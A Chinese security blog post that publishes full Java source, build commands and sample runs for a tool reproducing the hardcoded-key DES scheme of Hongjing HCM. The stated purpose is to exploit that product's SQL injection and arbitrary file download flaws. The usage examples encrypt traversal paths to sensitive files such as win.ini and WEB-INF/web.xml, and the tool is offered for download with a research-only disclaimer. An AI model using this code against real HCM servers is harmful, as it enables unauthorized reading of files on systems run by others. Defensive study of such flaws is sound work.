---
title: "HCMendetool-HCM宏景加解密工具"
source: https://mrxn.net/jswz/714.html
---

# HCMendetool-HCM宏景加解密工具

[Mrxn](https://mrxn.net/author/1)* 发表于2023/8/5 09:47
* 9151浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 简介

适用于宏景HCM的加解密，比如其sql注入漏洞或任意文件下载漏洞的利用

# 源码

```
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.util.Base64;

public class HCMendetool {
    //替换
    public static String encrypt2(String var0, String key) {
        if (null == var0) {
            return "";
        } else {
            String var1 = encrypt(key, var0.getBytes());
            var1 = var1.replaceAll("%", "@2HJ5@");
            var1 = var1.replaceAll("\\+", "@2HJB@");
            var1 = var1.replaceAll(" ", "@2HJ0@");
            var1 = var1.replaceAll("\\/", "@2HJF@");
            var1 = var1.replaceAll("\\?", "@3HJF@");
            var1 = var1.replaceAll("#", "@2HJ3@");
            var1 = var1.replaceAll("&", "@2HJ6@");
            var1 = var1.replaceAll("=", "@3HJD@");
            var1 = var1.replaceAll("\r\n", "").replaceAll("\n", "").replaceAll("\r", "");
            var1 = var1.replaceAll("@", "PAATTP");
            return var1;
        }
    }

    //加密
    public static String encrypt(String var0, byte[] var1) {
        String var2 = "";

        try {
            byte[] var3 = new byte[]{
                    1,
                    2,
                    3,
                    4,
                    5,
                    6,
                    7,
                    8
            };
            byte[] keyBytes;
            if (var0 != null && !var0.isEmpty()) {
                keyBytes = var0.getBytes();
            } else {
                keyBytes = "ilovethisgame".getBytes();
            }
            DESKeySpec var4 = new DESKeySpec(keyBytes);
            SecretKeyFactory var5 = SecretKeyFactory.getInstance("DES");
            SecretKey var6 = var5.generateSecret(var4);
            Cipher var7 = Cipher.getInstance("DES/CBC/PKCS5Padding");
            IvParameterSpec var8 = new IvParameterSpec(var3);
            var7.init(1, var6, var8);
            byte[] var10 = var7.doFinal(var1);
            var2 = Base64.getEncoder().encodeToString(var10);
        } catch (Exception var12) {
            var12.printStackTrace();
        }

        return var2;
    }

    //编码
    public static String encode(String var0) {
        if (var0 == null) {
            return "";
        } else {
            StringBuilder var1 = new StringBuilder();

            for (int var2 = 0; var2 < var0.length(); ++var2) {
                char var3;
                String var4;
                int var5;
                if ((var3 = var0.charAt(var2)) > 255) {
                    for (var5 = (var4 = Integer.toString(var3, 16)).length(); var5 < 4; ++var5) {
                        var4 = "0" + var4;
                    }

                    var1.append("^").append(var4);
                } else if (var3 >= 'A' && (var3 <= 'Z' || var3 >= 'a') && var3 <= 'z') {
                    var1.append(var3);
                } else {
                    for (var5 = (var4 = Integer.toString(var3, 16)).length(); var5 < 2; ++var5) {
                        var4 = "0" + var4;
                    }

                    var1.append("~").append(var4);
                }
            }

            return var1.toString();
        }
    }

    //解码
    public static String decode(String var0) {
        StringBuilder var1 = new StringBuilder();

        for (int var2 = 0; var2 < var0.length(); ++var2) {
            char var3 = var0.charAt(var2);
            if (var3 == '^') {
                // 解析出Unicode编码并转换为字符
                String unicodeStr = var0.substring(var2 + 1, var2 + 5);
                int unicode = Integer.parseInt(unicodeStr, 16);
                var1.append((char) unicode);
                var2 += 4; // 因为已经解析了4个字符（'^'和3位十六进制数），所以要跳过这4个字符
            } else if (var3 == '~') {
                // 解析出十六进制数并转换为字符
                String hexStr = var0.substring(var2 + 1, var2 + 3);
                int unicode = Integer.parseInt(hexStr, 16);
                var1.append((char) unicode);
                var2 += 2; // 因为已经解析了2个字符（'~'和2位十六进制数），所以要跳过这2个字符
            } else {
                var1.append(var3);
            }
        }

        return var1.toString();
    }

    //替换
    public static String decrypt2(String var0, String key) {
        if (null == var0) {
            return "";
        } else {
            var0 = var0.replaceAll("PAATTP", "@");
            var0 = var0.replaceAll("@2HJ5@", "%");
            var0 = var0.replaceAll("@2HJB@", "\\+");
            var0 = var0.replaceAll("@2HJ0@", " ");
            var0 = var0.replaceAll("@2HJF@", "\\/");
            var0 = var0.replaceAll("@3HJF@", "\\?");
            var0 = var0.replaceAll("@2HJ3@", "#");
            var0 = var0.replaceAll("@2HJ6@", "&");
            var0 = var0.replaceAll("@3HJD@", "=");
            return decrypt(var0, key);
        }
    }

    //解密
    public static String decrypt(String encryptedData, String... key) {
        String decryptedData = "";

        try {
            byte[] keyBytes;
            if (key.length > 0 && key[0] != null) {
                // 使用输入的秘钥
                keyBytes = key[0].getBytes();
            } else {
                // 使用默认秘钥
                keyBytes = "ilovethisgame".getBytes();
            }

            byte[] encryptedBytes = Base64.getDecoder().decode(encryptedData);
            byte[] iv = new byte[]{
                    1,
                    2,
                    3,
                    4,
                    5,
                    6,
                    7,
                    8
            };

            DESKeySpec spec = new DESKeySpec(keyBytes);
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
            SecretKey secretKey = keyFactory.generateSecret(spec);

            Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);

            byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
            decryptedData = new String(decryptedBytes);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return decryptedData;
    }

    //获取当前执行类路径
    public static String getCurrentFileName() {
        String path = HCMendetool.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        String[] segments = path.split("/");
        return segments[segments.length - 1];
    }

    public static void main(String[] args) {
        String fileName = getCurrentFileName();
        if (args.length < 2) {
            System.out.println("宏景HCM任意文件读取路径加密/解密工具\ngitub: https://github.com/Mr-xn/HCMendetool");
            System.out.println("请提供正确的参数！");
            System.out.println("用法: java -jar " + fileName + " -e/-d [文件路径/加密字符串] [秘钥(可选)]");
            return;
        }

        String option = args[0];
        String data = args[1];
        String key = null;

        if (args.length > 2) {
            key = args[2];
        }

        if ("-e".equals(option)) {
            String encryptedData = encrypt2(data, key);
            String encodeDate = encode(encryptedData);
            System.out.println("加密结果:\n" + encryptedData + "\n编码结果: \n" + encodeDate);
        } else if ("-d".equals(option)) {
            String decryptedData = decrypt2(decode(data), key);
            System.out.println("解密结果:\n" + decryptedData);
        } else {
            System.out.println("宏景HCM任意文件读取路径加密/解密工具\ngitub: https://github.com/Mr-xn/HCMendetool");
            System.out.println("请提供正确的参数！");
            System.out.println("用法: java -jar " + fileName + " -e/-d [文件路径/加密字符串] [秘钥(可选)]");
        }
    }

}
```

# 编译

```
javac HCMendetool.java
jar cef HCMendetool HCMendetool.jar HCMendetool.class
```

# 使用

```
➜ java -jar HCMendetool.jar
宏景HCM任意文件读取路径加密/解密工具
gitub: https://github.com/Mr-xn/HCMendetool
请提供正确的参数！
用法: java -jar HCMendetool.jar -e/-d [文件路径/加密字符串] [秘钥(可选)]
➜ java -jar HCMendetool.jar -e "C:\windows\win.ini"
加密结果:
6ZLV47bgJw71cMaltrlVM3dCFpcd5ypU
编码结果: 
~36ZLV~34~37bgJw~37~31cMaltrlVM~33dCFpcd~35ypU
➜ java -jar HCMendetool.jar -e "C:\\windows\\win.ini"
加密结果:
6ZLV47bgJw71cMaltrlVM3dCFpcd5ypU
编码结果: 
~36ZLV~34~37bgJw~37~31cMaltrlVM~33dCFpcd~35ypU
➜ java -jar HCMendetool.jar -e "C:\\\\windows\\\\win.ini"
加密结果:
lkxENDDiYj7yz0ayWe57PAATTP2HJBPAATTPuQPu68lGX5n
编码结果: 
lkxENDDiYj~37yz~30ayWe~35~37PAATTP~32HJBPAATTPuQPu~36~38lGX~35n
➜ java -jar HCMendetool.jar -e "C:/windows/win.ini"  
加密结果:
K2R3n7Sg4BCoATWnARk7SohTqIx31Olc
编码结果: 
K~32R~33n~37Sg~34BCoATWnARk~37SohTqIx~33~31Olc
➜ java -jar HCMendetool.jar -d "K2R3n7Sg4BCoATWnARk7SohTqIx31Olc"
解密结果:
C:/windows/win.ini
➜ java -jar HCMendetool.jar -d "lkxENDDiYj~37yz~30ayWe~35~37PAATTP~32HJBPAATTPuQPu~36~38lGX~35n"
解密结果:
C:\\windows\\win.ini
➜ java -jar HCMendetool.jar -e "../webapps/ROOT/WEB-INF/web.xml" 
加密结果:
8uHo1M8Ok6bllYA6aPmYQggrUSS6RBBHnx4Z18XWNGwPAATTP3HJDPAATTP
编码结果: 
~38uHo~31M~38Ok~36bllYA~36aPmYQggrUSS~36RBBHnx~34Z~31~38XWNGwPAATTP~33HJDPAATTP
```

# 下载

<https://github.com/Mr-xn/HCMendetool>

* 标签：
* [#
  代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#
  黑客工具](https://mrxn.net/tag/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  工具](https://mrxn.net/tag/%E5%B7%A5%E5%85%B7)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[HCMendetool-HCM宏景加解密工具](https://mrxn.net/jswz/714.html)
  
文章链接：
<https://mrxn.net/jswz/714.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/714.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/714.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});